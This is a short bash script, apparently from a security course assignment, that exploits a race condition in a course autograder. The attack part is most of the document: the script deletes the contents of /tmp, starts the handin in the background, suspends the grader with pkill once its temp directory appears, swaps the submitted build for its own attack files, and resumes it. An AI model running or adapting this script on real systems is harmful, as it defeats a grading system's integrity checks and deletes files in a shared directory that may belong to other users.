#!/bin/bash

#
# autograde.go creates a temp directory in /tmp after checking
# the blacklisted libraries. It then builds your handin.
#
# What's key here is that this takes place after all the checks
# against the blacklist.
#
# Once this directory is created, if you can replace its contents
# with a different executable, this'll then get passed to the autograder
#

ARRAY=()

# save current contents of tmp dir
for ENTRY in /tmp/*
do
  ARRAY+=($ENTRY)
done

# clear out the tmp directory
rm -rf /tmp/*

# run the cs666_handin script in the background
cd tmp
/course/cs666/bin/cs666_handin . &
cd ..

# loop until we find a directory in /tmp
while [ 1 ]
do

  # find the # of items in /tmp
  SIZE=$(ls -l /tmp | wc -l)

  # if there's a tmp directory and file
  if [ $SIZE -gt 2 ];
    then

      # pause process
      pkill -TSTP autograde.sh

      # save file name (this will be a temp file name, so use * since you don't know the extension)
      FILE=$(echo /tmp/cs666_bin_tmp.*)

      # remove file (to make it easier to copy into tmp directory)
      rm /tmp/cs666_bin_tmp.*

      # replace temp files with my attack
      cp ivy ivy.go main.go /tmp/*

      # continue background process
      pkill -CONT autograde.sh

      break
  fi

done

while [ 1 ]
do

  # once the autograding script has completed
  SIZE=$(pgrep autograde.sh | wc -l)

  if [ $SIZE -eq 0 ];
    then

      # clean up metadata from directory
      rm -rf /tmp/*

      for REPLACE in $ARRAY
      do
	if ! [ $REPLACE == "/tmp/*" ];
	  then
	    mkdir $REPLACE
	fi
      done

      break
  fi

done
